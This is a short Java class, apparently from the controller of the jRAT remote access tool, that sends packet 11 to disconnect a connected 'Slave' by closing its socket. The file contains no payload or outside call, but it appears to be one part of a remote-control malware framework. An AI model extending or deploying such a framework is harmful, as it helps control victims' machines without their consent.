package pro.jrat.client.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.client.Slave;
import pro.jrat.client.exceptions.CloseException;

public class Packet11Disconnect extends AbstractOutgoingPacket {

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.closeSocket(new CloseException("Disconnecting"));
	}

	@Override
	public byte getPacketId() {
		return 11;
	}

}
